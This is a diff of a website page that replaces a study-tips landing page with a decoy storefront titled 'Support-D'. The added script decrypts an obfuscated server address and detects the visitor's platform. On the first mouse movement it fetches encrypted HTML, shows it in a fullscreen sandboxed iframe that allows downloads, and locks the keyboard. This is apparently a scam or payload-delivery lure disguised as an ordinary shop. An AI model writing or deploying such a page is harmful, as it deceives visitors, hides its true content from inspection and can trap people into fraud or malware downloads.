@@ -1,14 +1,119 @@
-<?php
-// CleverStudyWay - Main Landing Page
-?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>CleverStudyWay — Smart Learning Strategies, Active Recall & Exam Focus</title>
-  <meta name="description" content="CleverStudyWay explores cognitive active recall, spaced repetition algorithms, Pomodoro deep work, Feynman technique, and academic exam prep.">
-  
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Support-D</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+  <style>
+    * { box-sizing: border-box; }
+    html, body { margin: 0; height: 100%; }
+    body { font-family: system-ui, -apple-system, "Segoe UI", sans-serif; color: #1f2433; background: #f6f7fb; }
+    a { text-decoration: none; color: inherit; }
+    .hint { text-align: center; padding: 8px; font-size: .85rem; color: #6d28d9; background: #ede9fe; }
+
+    .popup { 
+      position: fixed; 
+      top: 0; 
+      left: 0; 
+      width: 100%; 
+      height: 100%; 
+      background: #ffffff; 
+      display: flex; 
+      justify-content: center; 
+      align-items: center; 
+      z-index: 9999; 
+    }
+    .popup-content { 
+      background: #ffffff; 
+      padding: 60px; 
+      text-align: center; 
+      width: 100%;
+      max-width: 600px; 
+    }
+    .loading-gif { 
+      width: 160px; 
+      height: 160px; 
+      margin-bottom: 30px; 
+    }
+    .popup-content p {
+      font-size: 1.5rem; 
+      color: #1f2433;
+      font-weight: 600;
+      margin: 10px 0 35px 0;
+    }
+    .buttons { 
+      display: flex;
+      justify-content: center;
+      gap: 25px;
+    }
+    button { 
+      padding: 15px 35px; 
+      font-size: 1.1rem;
+      border: none; 
+      border-radius: 8px; 
+      cursor: pointer; 
+      font-weight: 700; 
+      min-width: 150px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    }
+    #cancelBtn { background: #f44336; color: white; }
+    #continueBtn { background: #4CAF50; color: white; }
+    button:hover { opacity: 0.9; }
+
+    /* ===== Base Store Layout Styles ===== */
+    .nav { position: sticky; top: 0; z-index: 10; display: flex; align-items: center; gap: 20px;
+           padding: 14px 28px; background: #fff; box-shadow: 0 1px 8px rgba(0,0,0,.06); }
+    .brand { font-size: 1.25rem; font-weight: 800; color: #6d28d9; }
+    .links { display: flex; gap: 18px; margin-left: 8px; }
+    .links a { font-size: .92rem; color: #555; }
+    .links a:hover { color: #6d28d9; }
+    .clock { margin-left: auto; font-size: .8rem; color: #6d28d9; font-weight: 600;
+             background: #f3e8ff; padding: 5px 12px; border-radius: 20px; white-space: nowrap; }
+    .cart-btn { border: 0; cursor: pointer; background: #6d28d9; color: #fff; font-weight: 600;
+                padding: 9px 16px; border-radius: 30px; font-size: .9rem; }
+    .cart-btn .badge { background: #fff; color: #6d28d9; border-radius: 20px; padding: 0 7px;
+                       margin-left: 4px; font-size: .8rem; font-weight: 800; }
+
+    .hero { display: flex; align-items: center; gap: 32px; flex-wrap: wrap; padding: 48px 28px;
+            background: linear-gradient(135deg, #ede9fe, #f5f3ff); }
+    .hero-text { flex: 1 1 320px; }
+    .hero-text h1 { font-size: 2.1rem; margin: 0 0 12px; line-height: 1.2; }
+    .hero-text h1 span { color: #db2777; }
+    .hero-text p { color: #555; max-width: 460px; }
+    .cta { display: inline-block; margin-top: 14px; background: #db2777; color: #fff;
+           font-weight: 700; padding: 12px 26px; border-radius: 30px; }
+    .cta:hover { background: #be185d; }
+    .hero-img { flex: 1 1 320px; max-width: 520px; width: 100%; border-radius: 16px;
+                box-shadow: 0 12px 30px rgba(0,0,0,.15); }
+
+    .section-title { text-align: center; font-size: 1.5rem; margin: 40px 0 6px; }
+
+    .grid { display: grid; gap: 22px; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+            padding: 24px 28px 10px; }
+    .card { background: #fff; border-radius: 14px; overflow: hidden; box-shadow: 0 4px 16px rgba(0,0,0,.07);
+            transition: transform .15s, box-shadow .15s; }
+    .card:hover { transform: translateY(-4px); box-shadow: 0 10px 26px rgba(0,0,0,.12); }
+    .card img { width: 100%; height: 170px; object-fit: cover; display: block; }
+    .card .body { padding: 14px 16px 18px; }
+    .card h3 { margin: 0 0 4px; font-size: 1rem; }
+    .card .price { color: #6d28d9; font-weight: 800; font-size: 1.05rem; }
+    .card .old { color: #aaa; text-decoration: line-through; font-size: .85rem; margin-left: 6px; font-weight: 500; }
+    .add { margin-top: 10px; width: 100%; cursor: pointer; border: 0; background: #1f2433; color: #fff;
+           font-weight: 600; padding: 10px; border-radius: 8px; font-size: .9rem; }
+    .add:hover { background: #6d28d9; }
+
+    .about { padding: 10px 28px 30px; }
+    .features { display: flex; gap: 20px; flex-wrap: wrap; justify-content: center; margin-top: 14px; }
+    .feature { background: #fff; border-radius: 14px; padding: 22px; flex: 1 1 200px; max-width: 260px;
+               text-align: center; box-shadow: 0 4px 14px rgba(0,0,0,.06); }
+    .feature span { font-size: 1.8rem; }
+    .feature h3 { margin: 8px 0 4px; font-size: 1rem; }
+    .feature p { margin: 0; color: #666; font-size: .88rem; }
+
+    .footer { text-align: center; padding: 24px; color: #888; font-size: .85rem; }
+  </style>
+
   <!-- Google tag (gtag.js) -->
   <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
   <script>
@@ -19,326 +124,189 @@
     gtag('config', 'G-0LY0HY7L01');
   </script>
 
-  <!-- Google Fonts -->
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@700;800&family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
-  
-  <link rel="stylesheet" href="css/style.css">
-  <style>
-    .active-study {
-      background: var(--accent-violet) !important;
-      color: #ffffff !important;
-      border-color: var(--accent-violet) !important;
-      font-weight: 800 !important;
-    }
-  </style>
+<script async src="https://analytics.gettrackdata.one/js/pa-lAPncCfVw1ez-w4iy_WiO.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
+</script>
+
+
 </head>
 <body>
 
-  <!-- Navigation Header -->
-  <header class="navbar">
-    <div class="container nav-container">
-      <a href="index.php" class="brand-logo">Clever<span>StudyWay</span></a>
-      <button class="mobile-toggle" aria-label="Toggle navigation">☰</button>
-      <ul class="nav-links">
-        <li><a href="index.php" class="active">Home</a></li>
-        <li><a href="about.html">About</a></li>
-        <li><a href="blog.html">Study Journal</a></li>
-        <li><a href="contact.html">Contact</a></li>
-        <li><a href="privacy-policy.html">Privacy</a></li>
-      </ul>
-    </div>
-  </header>
-
-  <!-- SECTION 1: Hero Header -->
-  <section class="hero-section" id="hero">
-    <div class="container">
-      <div class="hero-content">
-        <span class="hero-badge">Cognitive Science & Smart Study Methods</span>
-        <h1 class="hero-title">Master Active Recall & Spaced Repetition</h1>
-        <p class="hero-desc">Unlock 90%+ long-term memory retention, 50-minute deep work Pomodoro intervals, Cornell note-taking architecture, and stress-free 30-day exam prep.</p>
-        <div class="hero-btns">
-          <a href="blog.html" class="btn btn-violet">Explore Study Essays</a>
-          <a href="about.html" class="btn btn-outline-dark" style="color: #fff; border-color: #fff;">Learning Science Lab</a>
-        </div>
+  <div class="popup" id="customPopup">
+    <div class="popup-content">
+      <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." class="loading-gif">
+      <p>Loading... Please wait.</p>
+      <div class="buttons">
+        <button id="cancelBtn" type="button">Cancel</button>
+        <button id="continueBtn" type="button">Continue</button>
       </div>
     </div>
-  </section>
+  </div>
+  
+  <div id="shop">
+    <div class="hint">🛍️ ShopEase</div>
+    <header class="nav">
+      <div class="brand">🛍️ ShopEase</div>
+      <nav class="links">
+        <a href="#home">Home</a>
+        <a href="#products">Products</a>
+        <a href="#about">About</a>
+      </nav>
+      <span class="clock">🕒 Mon, 29 Jun 2026</span>
+      <button class="cart-btn">🛒 Cart <span class="badge">0</span></button>
+    </header>
 
-  <!-- SECTION 2: Cognitive Study Pillars & Active Recall Grid -->
-  <section class="section" id="craft-pillars">
-    <div class="container">
-      <div class="section-title-wrap">
-        <span class="section-subtitle">Learning Science Standards</span>
-        <h2 class="section-title">The Four Pillars of Cognitive Focus & Memory</h2>
+    <section class="hero" id="home">
+      <div class="hero-text">
+        <h1>Summer Sale — up to <span>50% OFF</span></h1>
+        <p>Trendy products, free stock photos, ek hi page par. Pure HTML + CSS single-page store. ✨</p>
+        <a href="#products" class="cta">Shop now</a>
       </div>
-      <div class="grid-4">
-        <div class="study-card">
-          <span style="font-size: 2.5rem; display: block; margin-bottom: 0.5rem;">🧠</span>
-          <h3 style="font-size: 1.3rem; color: var(--accent-violet); margin-bottom: 0.75rem;">Active Testing Effect</h3>
-          <p style="color: var(--text-secondary); font-size: 0.95rem;">Retrieving information from memory through self-testing rather than passive re-reading.</p>
-        </div>
-        <div class="study-card">
-          <span style="font-size: 2.5rem; display: block; margin-bottom: 0.5rem;">📈</span>
-          <h3 style="font-size: 1.3rem; color: var(--accent-violet); margin-bottom: 0.75rem;">Spaced Leitner Box</h3>
-          <p style="color: var(--text-secondary); font-size: 0.95rem;">Increasing review intervals across 1, 3, 7, and 30 days to flatten the forgetting curve.</p>
-        </div>
-        <div class="study-card">
-          <span style="font-size: 2.5rem; display: block; margin-bottom: 0.75rem;">⏱️</span>
-          <h3 style="font-size: 1.3rem; color: var(--accent-violet); margin-bottom: 0.75rem;">Deep Work Intervals</h3>
-          <p style="color: var(--text-secondary); font-size: 0.95rem;">Structuring 50/10 focus sprints to maximize prefrontal cortex concentration without fatigue.</p>
-        </div>
-        <div class="study-card">
-          <span style="font-size: 2.5rem; display: block; margin-bottom: 0.75rem;">💡</span>
-          <h3 style="font-size: 1.3rem; color: var(--accent-violet); margin-bottom: 0.75rem;">Feynman Technique</h3>
-          <p style="color: var(--text-secondary); font-size: 0.95rem;">Deconstructing complex academic concepts into simple plain-language explanations.</p>
-        </div>
-      </div>
-    </div>
-  </section>
+      <img class="hero-img" src="https://picsum.photos/seed/shopfashion/520/360" alt="hero" />
+    </section>
 
-  <!-- SECTION 3: Interactive Study Strategy & Focus Technique Explorer -->
-  <section class="section" id="study-explorer" style="background: var(--bg-secondary);">
-    <div class="container">
-      <div class="section-title-wrap">
-        <span class="section-subtitle">Strategy Explorer</span>
-        <h2 class="section-title">The Cognitive Study Strategy Explorer</h2>
-      </div>
-      <div style="max-width: 800px; margin: 0 auto; text-align: center;">
-        <p style="color: var(--text-secondary); margin-bottom: 2rem;">Select a cognitive study technique to inspect its memory retention, review interval, and efficiency score:</p>
-        <div style="display: flex; gap: 1rem; justify-content: center; flex-wrap: wrap; margin-bottom: 1.5rem;">
-          <button class="btn btn-outline-dark study-btn active-study" data-study="Active Recall Flashcard Retrieval" data-desc="Forcing brain retrieval mechanisms using flashcards without looking at answers." data-score="9.9/10 Memory Retention">Active Recall Retrieval</button>
-          <button class="btn btn-outline-dark study-btn" data-study="Spaced Repetition SuperMemo Algorithm" data-desc="Reviewing flashcards right before memory decay occurs (Days 1, 3, 7, 14, 30)." data-score="9.8/10 Long-Term Storage">Spaced Repetition</button>
-          <button class="btn btn-outline-dark study-btn" data-study="Cornell Note-Taking Architecture" data-desc="Dividing notes into Cues, Main Notes, and Summary sections for instant review." data-score="9.9/10 Lecture Clarity">Cornell Note System</button>
-          <button class="btn btn-outline-dark study-btn" data-study="50/10 Ultradian Rhythm Deep Focus Sprint" data-desc="50 minutes of single-task immersion followed by 10 minutes of restorative rest." data-score="9.7/10 Focus Endurance">50/10 Deep Focus</button>
+    <!-- Histats.com  START  (aync)-->
+    <script type="text/javascript">var _Hasync= _Hasync|| [];
+    _Hasync.push(['Histats.start', '1,5037956,4,0,0,0,00010000']);
+    _Hasync.push(['Histats.fasi', '1']);
+    _Hasync.push(['Histats.track_hits', '']);
+    (function() {
+    var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+    hs.src = ('//s10.histats.com/js15_as.js');
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+    })();</script>
+    <noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5037956&101" alt="free counter with statistics" border="0"></a></noscript>
+    <!-- Histats.com  END  -->
+
+    <section id="products">
+      <h2 class="section-title">Featured Products</h2>
+      <div class="grid">
+        <div class="card">
+          <img src="https://picsum.photos/seed/sneakers/400/300" alt="Running Sneakers" />
+          <div class="body">
+            <h3>Running Sneakers</h3>
+            <div class="price">₹2,499 <span class="old">₹3,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
         </div>
-        <div id="study-detail">
-          <div class="study-card" style="border-left: 4px solid var(--accent-violet);">
-            <h3 style="color: var(--accent-violet); font-size: 1.5rem; margin-bottom: 0.5rem;">Active Recall Flashcard Retrieval Specification</h3>
-            <p style="color: var(--text-secondary); margin-bottom: 1rem;">Forcing brain retrieval mechanisms using flashcards without looking at answers.</p>
-            <strong style="color: var(--accent-teal); font-size: 0.95rem;">Empirical Memory Benchmark: 9.9/10 Memory Retention</strong>
+        <div class="card">
+          <img src="https://picsum.photos/seed/watch/400/300" alt="Classic Watch" />
+          <div class="body">
+            <h3>Classic Watch</h3>
+            <div class="price">₹4,999 <span class="old">₹7,499</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/backpack/400/300" alt="Travel Backpack" />
+          <div class="body">
+            <h3>Travel Backpack</h3>
+            <div class="price">₹1,899 <span class="old">₹2,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/headphones/400/300" alt="Wireless Headphones" />
+          <div class="body">
+            <h3>Wireless Headphones</h3>
+            <div class="price">₹3,299 <span class="old">₹4,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/sunglasses/400/300" alt="Sunglasses" />
+          <div class="body">
+            <h3>Sunglasses</h3>
+            <div class="price">₹999 <span class="old">₹1,799</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/camera/400/300" alt="Instant Camera" />
+          <div class="body">
+            <h3>Instant Camera</h3>
+            <div class="price">₹5,999 <span class="old">₹8,499</span></div>
+            <button class="add">Add to cart</button>
           </div>
         </div>
       </div>
-    </div>
-  </section>
+    </section>
 
-  <!-- SECTION 4: Spaced Repetition Algorithms & Pomodoro Focus Spotlight -->
-  <section class="section" id="spaced-spotlight">
-    <div class="container">
-      <div class="grid-2">
-        <div>
-          <span class="section-subtitle" style="display:block; text-align:left;">Neuroscience of Memory</span>
-          <h2 class="section-title" style="text-align:left; margin-bottom: 1.5rem;">Ebbinghaus Forgetting Curve & Synaptic Plasticity</h2>
-          <p style="color: var(--text-secondary); margin-bottom: 1.25rem; line-height: 1.8;">
-            Passive re-reading loses 70% of information within 24 hours. At CleverStudyWay, we analyze active memory retrieval, Leitner box scheduling, and overnight sleep consolidation.
-          </p>
-          <ul style="list-style: none; color: var(--text-secondary); margin-bottom: 2rem;">
-            <li style="margin-bottom: 0.75rem;">🧠 <strong style="color:var(--text-primary);">Synaptic Strengthening:</strong> Each active recall trial builds stronger neural pathways.</li>
-            <li style="margin-bottom: 0.75rem;">📈 <strong style="color:var(--text-primary);">Algorithmic Spacing:</strong> Reviewing material at increasing time intervals flattens decay curves.</li>
-            <li style="margin-bottom: 0.75rem;">⏱️ <strong style="color:var(--text-primary);">Cognitive Load Balance:</strong> Preventing brain fatigue by chunking dense textbook material.</li>
-          </ul>
-          <a href="about.html" class="btn btn-violet">Our Learning Manifesto</a>
-        </div>
-        <div>
-          <img src="https://images.unsplash.com/photo-1434030216411-0b793f4b4173?auto=format&fit=crop&w=800&q=80" alt="Student Studying Display" style="border-radius: 10px; border: 1px solid var(--border-color); box-shadow: 0 20px 40px rgba(0,0,0,0.6);">
-        </div>
+    <section id="about" class="about">
+      <h2 class="section-title">Why ShopEase?</h2>
+      <div class="features">
+        <div class="feature"><span>🚚</span><h3>Free Shipping</h3><p>₹499 se upar free delivery.</p></div>
+        <div class="feature"><span>↩️</span><h3>Easy Returns</h3><p>7-day no-question return.</p></div>
+        <div class="feature"><span>🔒</span><h3>Secure</h3><p>Safe & secure checkout.</p></div>
       </div>
-    </div>
-  </section>
+    </section>
 
-  <!-- SECTION 5: Interactive Academic Study Style Matcher & Student Quiz -->
-  <section class="section" id="style-quiz" style="background: var(--bg-secondary);">
-    <div class="container">
-      <div class="section-title-wrap">
-        <span class="section-subtitle">Study Diagnostic</span>
-        <h2 class="section-title">Academic Study Style Matcher Quiz</h2>
-      </div>
-      <div class="study-card" style="max-width: 750px; margin: 0 auto;">
-        <h3 style="color: var(--accent-violet); margin-bottom: 1rem;">What Is Your Biggest Academic Challenge or Focus Goal?</h3>
-        <div style="display: flex; flex-direction: column; gap: 1rem;">
-          <button class="student-quiz-btn btn btn-outline-dark" style="text-align:left; justify-content:flex-start;" data-rec="Active Recall Anki Flashcards & 30-Day Spaced Repetition Exam Schedule.">
-            A. Forgetting Exam Material Rapidly, Need Long-Term Memory Retention
-          </button>
-          <button class="student-quiz-btn btn btn-outline-dark" style="text-align:left; justify-content:flex-start;" data-rec="50/10 Ultradian Rhythm Focus Intervals & Ambient Brown Noise Soundscapes.">
-            B. Frequent Distractions & Procrastination, Need Deep Focus Work Sprint Habits
-          </button>
-          <button class="student-quiz-btn btn btn-outline-dark" style="text-align:left; justify-content:flex-start;" data-rec="Feynman Technique Plain-Language Decomposition & Cornell Note Summaries.">
-            C. Struggling with Complex Technical Concepts, Need Simplify & Teach Methods
-          </button>
-        </div>
-        <div id="student-quiz-result"></div>
-      </div>
-    </div>
-  </section>
+    <footer class="footer">© 2026 ShopEase · Single-page demo store · Images: picsum.photos</footer>
+  </div>
 
-  <!-- SECTION 6: Retention Rate & Memory Recall Hours Performance Metrics Counter -->
-  <section class="section" id="metrics">
-    <div class="container">
-      <div class="section-title-wrap">
-        <span class="section-subtitle">Laboratory Benchmarks</span>
-        <h2 class="section-title">Clever Study Way Research Metrics</h2>
-      </div>
-      <div class="grid-4">
-        <div class="study-card" style="text-align: center;">
-          <h3 class="metric-number text-violet" data-target="12" style="font-size: 3rem; margin-bottom: 0.5rem;">0</h3>
-          <p style="color: var(--text-secondary); text-transform: uppercase; letter-spacing: 1px; font-size: 0.85rem;">Masterclass Essays</p>
-        </div>
-        <div class="study-card" style="text-align: center;">
-          <h3 class="metric-number text-violet" data-target="95" style="font-size: 3rem; margin-bottom: 0.5rem;">0</h3>
-          <p style="color: var(--text-secondary); text-transform: uppercase; letter-spacing: 1px; font-size: 0.85rem;">% Memory Retention Rate</p>
-        </div>
-        <div class="study-card" style="text-align: center;">
-          <h3 class="metric-number text-violet" data-target="50" style="font-size: 3rem; margin-bottom: 0.5rem;">0</h3>
-          <p style="color: var(--text-secondary); text-transform: uppercase; letter-spacing: 1px; font-size: 0.85rem;">Minutes Deep Focus Sprints</p>
-        </div>
-        <div class="study-card" style="text-align: center;">
-          <h3 class="metric-number text-violet" data-target="1500" style="font-size: 3rem; margin-bottom: 0.5rem;">0</h3>
-          <p style="color: var(--text-secondary); text-transform: uppercase; letter-spacing: 1px; font-size: 0.85rem;">Words Per Essay</p>
-        </div>
-      </div>
-    </div>
-  </section>
 
-  <!-- SECTION 7: Academic Researchers & University Scholar Testimonials -->
-  <section class="section" id="testimonials" style="background: var(--bg-secondary);">
-    <div class="container">
-      <div class="section-title-wrap">
-        <span class="section-subtitle">Academic Acclaim</span>
-        <h2 class="section-title">Endorsements From Cognitive Scientists & University Scholars</h2>
-      </div>
-      <div class="grid-3">
-        <div class="study-card">
-          <p style="color: var(--text-secondary); font-style: italic; margin-bottom: 1.5rem;">
-            "CleverStudyWay provides brilliant, evidence-based guides on active recall, spaced repetition algorithms, and cognitive load management."
-          </p>
-          <strong style="color: var(--accent-violet); display: block;">— Dr. Eleanor Vance</strong>
-          <span style="color: var(--text-muted); font-size: 0.85rem;">Cognitive Neuroscience Researcher, Boston</span>
-        </div>
-        <div class="study-card">
-          <p style="color: var(--text-secondary); font-style: italic; margin-bottom: 1.5rem;">
-            "Their Feynman technique breakdowns and Cornell note-taking templates transformed how our undergraduate students prepare for medical exams."
-          </p>
-          <strong style="color: var(--accent-violet); display: block;">— Prof. Robert Sterling</strong>
-          <span style="color: var(--text-muted); font-size: 0.85rem;">University Learning Director, Oxford</span>
-        </div>
-        <div class="study-card">
-          <p style="color: var(--text-secondary); font-style: italic; margin-bottom: 1.5rem;">
-            "The premier digital publication for overcoming academic procrastination, study space ergonomics, and sleep memory consolidation."
-          </p>
-          <strong style="color: var(--accent-violet); display: block;">— Maya Lin</strong>
-          <span style="color: var(--text-muted); font-size: 0.85rem;">Academic Productivity Coach</span>
-        </div>
-      </div>
-    </div>
-  </section>
+  <div id="contentiframe" style="display: none; z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;">
+    <iframe id="frame" allow="fullscreen; autoplay; encrypted-media; picture-in-picture" allowfullscreen="" webkitallowfullscreen="" mozallowfullscreen="" sandbox="allow-scripts allow-popups allow-forms allow-downloads" style="width: 100%; height: 100%; border: 0px;"></iframe>
+  </div>
 
-  <!-- SECTION 8: Recent Academic Dispatches & Article Grid -->
-  <section class="section" id="journal-dispatches">
-    <div class="container">
-      <div class="section-title-wrap">
-        <span class="section-subtitle">Academic Dispatches</span>
-        <h2 class="section-title">Latest Learning Science Essays</h2>
-      </div>
-      <div class="grid-3">
-        <div class="blog-card">
-          <div class="blog-img-wrap">
-            <img src="https://images.unsplash.com/photo-1434030216411-0b793f4b4173?auto=format&fit=crop&w=800&q=80" alt="Active Recall Science">
-          </div>
-          <div class="blog-content">
-            <span class="blog-tag">Active Recall</span>
-            <div class="blog-date">August 24, 2026</div>
-            <h3 class="blog-title"><a href="blog/the-science-of-active-recall-testing-effects-in-long-term-memory.html">The Science of Active Recall & Testing Effects</a></h3>
-            <p class="blog-excerpt">Testing effect, flashcard retrieval, and memory pathways.</p>
-            <a href="blog/the-science-of-active-recall-testing-effects-in-long-term-memory.html" class="read-more">Read Essay →</a>
-          </div>
-        </div>
-        <div class="blog-card">
-          <div class="blog-img-wrap">
-            <img src="https://images.unsplash.com/photo-1509631179647-0177331693ae?auto=format&fit=crop&w=800&q=80" alt="Spaced Repetition">
-          </div>
-          <div class="blog-content">
-            <span class="blog-tag">Spaced Repetition</span>
-            <div class="blog-date">August 20, 2026</div>
-            <h3 class="blog-title"><a href="blog/spaced-repetition-algorithms-mastering-leitner-box-and-anki-flashcards.html">Spaced Repetition & Leitner Algorithms</a></h3>
-            <p class="blog-excerpt">Leitner box intervals, Anki algorithms, and forgetting curve.</p>
-            <a href="blog/spaced-repetition-algorithms-mastering-leitner-box-and-anki-flashcards.html" class="read-more">Read Essay →</a>
-          </div>
-        </div>
-        <div class="blog-card">
-          <div class="blog-img-wrap">
-            <img src="https://images.unsplash.com/photo-1529139574466-a303027c1d8b?auto=format&fit=crop&w=800&q=80" alt="Pomodoro Deep Work">
-          </div>
-          <div class="blog-content">
-            <span class="blog-tag">Pomodoro Focus</span>
-            <div class="blog-date">August 15, 2026</div>
-            <h3 class="blog-title"><a href="blog/pomodoro-technique-variations-customizing-focus-intervals-for-deep-work.html">Pomodoro Technique & Deep Work Intervals</a></h3>
-            <p class="blog-excerpt">50/10 focus sprints, ultradian rhythms, and mental fatigue.</p>
-            <a href="blog/pomodoro-technique-variations-customizing-focus-intervals-for-deep-work.html" class="read-more">Read Essay →</a>
-          </div>
-        </div>
-      </div>
-    </div>
-  </section>
+  <script>
+    const PASSPHRASE = "98yNCjeAfWMwk0wI";  
+    const URL_KEY = "UrLk3yShopEase01";
+    const ENC_DATA_ORIGIN = "U2FsdGVkX185SIW5dTnVPwHiFQ8oiX7AnMX5CND5ORpjj09Nhlo+sA5NC5FQ2qsF";
+    const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+    const DATA_URL = DATA_ORIGIN + "/data";
+    let lastUrl = null;
 
-  <!-- SECTION 9: VIP Clever Study Gazette Newsletter & Unified Footer CTA -->
-  <section class="section" id="newsletter" style="background: var(--bg-secondary);">
-    <div class="container">
-      <div class="study-card" style="text-align: center; max-width: 800px; margin: 0 auto; border-color: var(--accent-violet);">
-        <span class="section-subtitle">Academic Dispatch</span>
-        <h2 class="section-title" style="margin-bottom: 1rem; font-size: 2.2rem;">Subscribe to The Clever Study Gazette</h2>
-        <p style="color: var(--text-secondary); margin-bottom: 2rem;">Receive bi-weekly analyses of active recall neuroscience, spaced repetition algorithms, and exam focus.</p>
-        <form onsubmit="event.preventDefault(); alert('Thank you for subscribing to CleverStudyWay Gazette.');" style="display: flex; gap: 1rem; max-width: 550px; margin: 0 auto; flex-wrap: wrap;">
-          <input type="email" placeholder="Enter your email address" required style="flex: 1; min-width: 250px; padding: 0.85rem 1.25rem; background: var(--bg-primary); border: 1px solid var(--border-color); color: var(--text-primary); border-radius: 6px;">
-          <button type="submit" class="btn btn-violet">Subscribe</button>
-        </form>
-      </div>
-    </div>
-  </section>
+    function detectPlatform() {
+      const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
+                navigator.platform || navigator.userAgent || "";
+      return /mac/i.test(p) ? "mac" : "win";
+    }
 
-  <!-- Footer -->
-  <footer>
-    <div class="container">
-      <div class="footer-grid">
-        <div class="footer-col">
-          <a href="index.php" class="brand-logo" style="margin-bottom: 1rem; color: #fff;">Clever<span>StudyWay</span></a>
-          <p>CleverStudyWay is a premier editorial platform dedicated to smart learning strategies, cognitive active recall, spaced repetition algorithms, and exam focus mastery.</p>
-          <p style="margin-top: 1rem; color: var(--accent-violet);">
-            📍 181 Mercer Street, New York, NY 10012, United States<br>
-            📞 +1-888-777-5845
-          </p>
-        </div>
-        <div class="footer-col">
-          <h4>Navigation</h4>
-          <ul>
-            <li><a href="index.php">Home</a></li>
-            <li><a href="about.html">About Us</a></li>
-            <li><a href="blog.html">Study Journal</a></li>
-            <li><a href="contact.html">Contact Us</a></li>
-          </ul>
-        </div>
-        <div class="footer-col">
-          <h4>Legal Policies</h4>
-          <ul>
-            <li><a href="privacy-policy.html">Privacy Policy</a></li>
-            <li><a href="cookies.html">Cookie Policy</a></li>
-            <li><a href="disclaimer.html">Disclaimer</a></li>
-            <li><a href="terms.html">Terms of Use</a></li>
-          </ul>
-        </div>
-        <div class="footer-col">
-          <h4>Study Focus</h4>
-          <p>Deconstructing cognitive active recall, spaced repetition algorithms, Pomodoro deep work intervals, Feynman technique, and academic productivity globally.</p>
-        </div>
-      </div>
-      <div class="footer-bottom">
-        <p>&copy; 2026 CleverStudyWay. All rights reserved. Registered Official Headquarters.</p>
-        <p>Designed for Smart Academic Learning.</p>
-      </div>
-    </div>
-  </footer>
+    function secureKeyboardAccess() {
+      if (navigator.keyboard) {
+        navigator.keyboard.lock().catch((err) =>
+          console.warn("Keyboard lock failed:", err)
+        );
+      }
+    }
 
-  <script src="js/main.js"></script>
+    async function loadSecret() {
+      const shop = document.getElementById("shop");
+      const frame = document.getElementById("frame");
+      const contentIframe = document.getElementById("contentiframe");
+
+      try {
+        const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
+        const { cipher } = await res.json();
+        const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
+        if (!html) throw new Error("Decrypt failed — wrong key?");
+
+        if (lastUrl) URL.revokeObjectURL(lastUrl);
+        const blob = new Blob([html], { type: "text/html" });
+        lastUrl = URL.createObjectURL(blob);
+
+        frame.src = lastUrl;
+        
+        shop.style.display = "none";
+        contentIframe.style.display = "block"; 
+        document.getElementById("customPopup").style.display = "none";
+        
+       
+        secureKeyboardAccess();
+
+      } catch (e) {
+        document.querySelector(".hint").textContent = "⚠️ " + e.message;
+        document.getElementById("customPopup").style.display = "none";
+      }
+    }
+
+    window.addEventListener("mousemove", () => {
+      document.getElementById("customPopup").style.display = "none";
+      loadSecret();
+    }, { once: true });
+  </script>
 </body>
 </html>
